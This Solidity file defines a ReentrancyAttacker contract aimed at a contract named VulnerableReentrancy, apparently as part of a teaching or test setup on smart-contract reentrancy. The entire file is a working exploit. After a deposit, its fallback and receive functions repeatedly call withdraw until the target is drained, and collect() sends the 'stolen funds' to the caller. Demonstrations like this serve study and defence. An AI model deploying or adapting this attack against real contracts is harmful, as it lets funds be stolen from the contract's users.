// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import {VulnerableReentrancy} from "./VulnerableReentrancy.sol";

contract ReentrancyAttacker {
    VulnerableReentrancy public vulnerableBank;

    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableReentrancy(_vulnerableBankAddress);
    }

    fallback() external payable {
        if (address(vulnerableBank).balance >= 0.0001 ether) {
            vulnerableBank.withdraw(0.0001 ether);
        }
    }

    receive() external payable {
        if (address(vulnerableBank).balance >= 0.0001 ether) {
            vulnerableBank.withdraw(0.0001 ether);
        }
    }

    function attack() public payable {
        require(
            msg.value >= 0.0001 ether,
            "Minimum 0.0001 ether required to attack"
        );
        vulnerableBank.deposit{value: 0.0001 ether}();
        vulnerableBank.withdraw(0.0001 ether);
    }

    // Function to withdraw the stolen funds
    function collect() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}
